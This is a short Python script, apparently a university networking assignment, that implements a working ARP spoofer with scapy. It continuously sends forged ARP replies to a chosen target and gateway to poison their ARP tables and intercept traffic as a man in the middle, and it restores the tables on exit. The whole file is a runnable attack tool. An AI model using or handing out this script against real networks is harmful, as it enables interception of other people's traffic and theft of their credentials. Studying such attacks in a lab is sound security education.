"""
ICT 2203
Assignment 1
ARP Spoofer
"""

import sys
import scapy.all as scapy
import time
import pyfiglet

# To get MAC address of target and router
def get_mac(ip):
	arp_req = scapy.ARP(pdst = ip)
	broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
	broadcast_arp_req = broadcast / arp_req
	reply = scapy.srp(broadcast_arp_req, timeout = 5, verbose = False)[0]
	return reply[0][1].hwsrc

# Poison Target's and Gateway's ARP tables 
def spoof(target_ip, spoof_ip):
	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip),
															psrc = spoof_ip)
	scapy.send(packet, verbose = False)

# Reset ARP tables back to original values
def reset(destination_ip, source_ip):
    print("\n[*] Restoring Targets' ARP tables...")
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)
	
# Display instructions
def msg():
    title = pyfiglet.figlet_format("ARP Spoofer")
    print(title)
    print("\nUsage: ")
    print("\n$ python3 arpspf.py <target IP> <gateway IP>")
    print("\nFollow the above format to prevent the error shown below: \n")

# Mitm attack function
def attack():
    try:
        packets_count = 0
        while True:                             # update ARP tables constantly
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            packets_count += 2
            print("\r[*]" + str(packets_count) + "packets sent ", end ="")
            time.sleep(2)                       # 2s wait before updating ARP table again
    except KeyboardInterrupt:                   # exit program with keyboard interrupt
        print("\n[!] Exiting ARP Spoofer...")
        reset(gateway_ip, target_ip)
        reset(target_ip, gateway_ip)
        print("[+] Arp Spoof Stopped")

if __name__ == '__main__':
    if len(sys.argv) != 3:
        msg()
    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    attack()